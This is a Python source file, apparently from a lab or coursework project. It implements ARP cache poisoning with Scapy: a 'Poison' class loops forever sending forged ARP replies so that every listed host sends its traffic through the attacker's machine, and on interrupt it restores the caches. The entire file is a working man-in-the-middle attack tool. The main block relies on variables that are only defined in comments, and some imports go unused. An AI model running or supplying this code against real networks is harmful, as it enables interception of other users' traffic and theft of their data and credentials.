from asyncore import loop
from scapy.all import *
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
import os
from time import sleep
import scan

# interface = 'enp0s3'
# hosts = [["192.168.56.101", "08:00:27:b7:c4:af"], 
#         ["192.168.56.102", "08:00:27:cc:08:6f"]]
# interval = 2

class Poison:

    interface = ' '
    hosts = ' '
    interval = ' '
    attackerMAC = ' '

    def __init__(self, interface, hosts, interval):
        self.interface = interface
        self.hosts = hosts
        self.interval = interval
        self.attackerMAC = get_if_hwaddr(self.interface)

    def poison(self):
        print("Arp poisoning selected hosts with given arguments")
        print("Press ctrl-c or del to terminate the attack")

        def sendPoison(srcIP, dstIP, dstMAC):
            arp = Ether() / ARP()
            arp[Ether].src = self.attackerMAC
            arp[ARP].hwsrc = self.attackerMAC
            arp[ARP].psrc = srcIP
            arp[ARP].hwdst = dstMAC
            arp[ARP].pdst = dstIP

            sendp(arp, iface=self.interface)

        try:
            while True:
                for host1 in self.hosts:
                    for host2 in self.hosts:
                        if host1 != host2:
                            sendPoison(host1[0], host2[0], host2[1])
                sleep(self.interval)
        except KeyboardInterrupt:
            self.restore()

    def restore(self):
        print("Terminating attack, restoring caches")

        def sendRestore(srcIP, srcMAC, dstIP,  dstMAC):
            arp = Ether() / ARP()
            arp[Ether].src = self.attackerMAC
            arp[ARP].hwsrc = srcMAC
            arp[ARP].psrc = srcIP
            arp[ARP].hwdst = dstMAC
            arp[ARP].pdst = dstIP

            sendp(arp, iface=self.interface)
        
        for host1 in self.hosts:
            for host2 in self.hosts:
                if host1 != host2:
                    sendRestore(host1[0], host1[1], host2[0], host2[1])


if __name__ == '__main__':
    arp = Poison(interface, hosts, interval)
    arp.poison()
